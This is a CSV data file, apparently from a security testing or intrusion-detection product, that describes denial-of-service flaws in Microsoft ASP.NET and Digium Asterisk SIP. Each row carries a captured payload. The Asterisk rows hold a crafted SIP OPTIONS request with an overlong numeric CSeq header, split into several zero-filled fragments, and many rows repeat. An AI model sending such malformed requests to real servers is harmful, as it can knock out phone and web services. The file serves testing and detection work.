XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
FSC20090811-04_Microsoft_ASP.NET_Error_Handling_Denial_Of_Service.xml,Microsoft ASP.NET Error Handling Denial Of Service,"A denial of service vulnerability exists within Microsoft ASP.NET. The vulnerability is due to improperly handling of malicious HTTP requests. An attacker can exploit this issue to cause the affected server to become unresponsive to ASP.NET-script requests installed on Internet Information Services (IIS) 7.0. Web pages that do not use ASP.NET scripts will continue to be handled by the Web server. In a successful attack case, the affected Web server will become unresponsive to new ASP-NET-scripts requests until the associated application pool is restarted.",HTTP/HTTPS,TCP,"HTTP/1.1 400 Bad Request[[0D 0A ]]Content-Type: text/html[[0D 0A ]]Server: Microsoft-IIS/7.0[[0D 0A ]]X-Powered-By: ASP.NET[[0D 0A ]]Date: Fri, 21 Aug 2009 15:26:29 GMT[[0D 0A ]]Content-Length: 11[[0D 0A 0D 0A ]]Bad Request"
FSC20090811-04_Microsoft_ASP.NET_Error_Handling_Denial_Of_Service.xml,Microsoft ASP.NET Error Handling Denial Of Service,"A denial of service vulnerability exists within Microsoft ASP.NET. The vulnerability is due to improperly handling of malicious HTTP requests. An attacker can exploit this issue to cause the affected server to become unresponsive to ASP.NET-script requests installed on Internet Information Services (IIS) 7.0. Web pages that do not use ASP.NET scripts will continue to be handled by the Web server. In a successful attack case, the affected Web server will become unresponsive to new ASP-NET-scripts requests until the associated application pool is restarted.",HTTP/HTTPS,TCP,"HTTP/1.1 400 Bad Request[[0D 0A ]]Content-Type: text/html[[0D 0A ]]Server: Microsoft-IIS/7.0[[0D 0A ]]X-Powered-By: ASP.NET[[0D 0A ]]Date: Fri, 21 Aug 2009 15:26:29 GMT[[0D 0A ]]Content-Length: 11[[0D 0A 0D 0A ]]Bad Request"
FSC20090811-04_Microsoft_ASP.NET_Error_Handling_Denial_Of_Service.xml,Microsoft ASP.NET Error Handling Denial Of Service,"A denial of service vulnerability exists within Microsoft ASP.NET. The vulnerability is due to improperly handling of malicious HTTP requests. An attacker can exploit this issue to cause the affected server to become unresponsive to ASP.NET-script requests installed on Internet Information Services (IIS) 7.0. Web pages that do not use ASP.NET scripts will continue to be handled by the Web server. In a successful attack case, the affected Web server will become unresponsive to new ASP-NET-scripts requests until the associated application pool is restarted.",HTTP/HTTPS,TCP,"HTTP/1.1 400 Bad Request[[0D 0A ]]Content-Type: text/html[[0D 0A ]]Server: Microsoft-IIS/7.0[[0D 0A ]]X-Powered-By: ASP.NET[[0D 0A ]]Date: Fri, 21 Aug 2009 15:26:29 GMT[[0D 0A ]]Content-Length: 11[[0D 0A 0D 0A ]]Bad Request"
﻿FSC20090812-01_Digium_Asterisk_SIP_sscanf_Multiple_Denial_of_Service_Vulnerabilities.xml,Digium Asterisk SIP sscanf Multiple Denial of Service Vulnerabilities,A denial of service vulnerability has been reported in Asterisk SIP Channel Driver. The vulnerability is due to insufficient input validation when processing maliciously crafted SIP requests. Remote authenticated attackers could exploit this vulnerability by crafting SIP requests that contain excessively long numeric strings. Successful exploitation could result in a denial of service condition.,SIP,TCP,OPTIONS sip:foobar@dhcp79 SIP/2.0[[0D 0A ]]Via: SIP/2.0/TCP 127.0.0.1:35467;branch=z9hGA4K.1ab92fa6;rport;alias[[0D 0A ]]From: sip:sipsak@127.0.0.1:35467;tag=69a356fa[[0D 0A ]]To: sip:foobar@dhcp79[[0D 0A ]]Call-ID: 1772639994@127.0.0.1[[0D 0A ]]CSeq: 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
FSC20090812-01_Digium_Asterisk_SIP_sscanf_Multiple_Denial_of_Service_Vulnerabilities.xml,Digium Asterisk SIP sscanf Multiple Denial of Service Vulnerabilities,A denial of service vulnerability has been reported in Asterisk SIP Channel Driver. The vulnerability is due to insufficient input validation when processing maliciously crafted SIP requests. Remote authenticated attackers could exploit this vulnerability by crafting SIP requests that contain excessively long numeric strings. Successful exploitation could result in a denial of service condition.,SIP,TCP,00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
FSC20090812-01_Digium_Asterisk_SIP_sscanf_Multiple_Denial_of_Service_Vulnerabilities.xml,Digium Asterisk SIP sscanf Multiple Denial of Service Vulnerabilities,A denial of service vulnerability has been reported in Asterisk SIP Channel Driver. The vulnerability is due to insufficient input validation when processing maliciously crafted SIP requests. Remote authenticated attackers could exploit this vulnerability by crafting SIP requests that contain excessively long numeric strings. Successful exploitation could result in a denial of service condition.,SIP,TCP,00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
FSC20090812-01_Digium_Asterisk_SIP_sscanf_Multiple_Denial_of_Service_Vulnerabilities.xml,Digium Asterisk SIP sscanf Multiple Denial of Service Vulnerabilities,A denial of service vulnerability has been reported in Asterisk SIP Channel Driver. The vulnerability is due to insufficient input validation when processing maliciously crafted SIP requests. Remote authenticated attackers could exploit this vulnerability by crafting SIP requests that contain excessively long numeric strings. Successful exploitation could result in a denial of service condition.,SIP,TCP,00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
FSC20090812-01_Digium_Asterisk_SIP_sscanf_Multiple_Denial_of_Service_Vulnerabilities.xml,Digium Asterisk SIP sscanf Multiple Denial of Service Vulnerabilities,A denial of service vulnerability has been reported in Asterisk SIP Channel Driver. The vulnerability is due to insufficient input validation when processing maliciously crafted SIP requests. Remote authenticated attackers could exploit this vulnerability by crafting SIP requests that contain excessively long numeric strings. Successful exploitation could result in a denial of service condition.,SIP,TCP,00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
FSC20090812-01_Digium_Asterisk_SIP_sscanf_Multiple_Denial_of_Service_Vulnerabilities.xml,Digium Asterisk SIP sscanf Multiple Denial of Service Vulnerabilities,A denial of service vulnerability has been reported in Asterisk SIP Channel Driver. The vulnerability is due to insufficient input validation when processing maliciously crafted SIP requests. Remote authenticated attackers could exploit this vulnerability by crafting SIP requests that contain excessively long numeric strings. Successful exploitation could result in a denial of service condition.,SIP,TCP,00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
FSC20090812-01_Digium_Asterisk_SIP_sscanf_Multiple_Denial_of_Service_Vulnerabilities.xml,Digium Asterisk SIP sscanf Multiple Denial of Service Vulnerabilities,A denial of service vulnerability has been reported in Asterisk SIP Channel Driver. The vulnerability is due to insufficient input validation when processing maliciously crafted SIP requests. Remote authenticated attackers could exploit this vulnerability by crafting SIP requests that contain excessively long numeric strings. Successful exploitation could result in a denial of service condition.,SIP,TCP,00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
